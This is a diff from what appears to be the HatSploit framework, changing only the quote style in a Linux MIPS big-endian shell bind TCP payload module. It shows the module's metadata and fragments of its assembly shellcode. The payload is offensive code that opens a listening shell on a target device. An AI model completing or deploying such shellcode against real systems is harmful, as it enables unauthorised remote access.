@@ -10,21 +10,21 @@ from pex.socket import Socket
 
 class HatSploitPayload(Payload, Assembler, Socket):
     details = {
-        "Name": "Linux mipsbe Shell Bind TCP",
-        "Payload": "linux/mipsbe/shell_bind_tcp",
-        "Authors": ["Ivan Nikolsky (enty8080) - payload developer"],
-        "Description": "Shell bind TCP payload for Linux mipsbe.",
-        "Architecture": "mipsbe",
-        "Platform": "linux",
-        "Rank": "high",
-        "Type": "bind_tcp",
+        'Name': "Linux mipsbe Shell Bind TCP",
+        'Payload': "linux/mipsbe/shell_bind_tcp",
+        'Authors': ['Ivan Nikolsky (enty8080) - payload developer'],
+        'Description': "Shell bind TCP payload for Linux mipsbe.",
+        'Architecture': "mipsbe",
+        'Platform': "linux",
+        'Rank': "high",
+        'Type': "bind_tcp",
     }
 
     def run(self):
-        bport = self.pack_port(self.handler["BPORT"], "big")
+        bport = self.pack_port(self.handler['BPORT'], 'big')
 
         return self.assemble(
-            self.details["Architecture"],
+            self.details['Architecture'],
             f"""
             start:
                 addiu $sp, $sp, -0x20
@@ -93,5 +93,5 @@ class HatSploitPayload(Payload, Assembler, Socket):
                 addiu $a1, $sp, -8
                 addiu $v0, $zero, 0xfab
                 syscall 0x40404
-            """,
+            """
         )
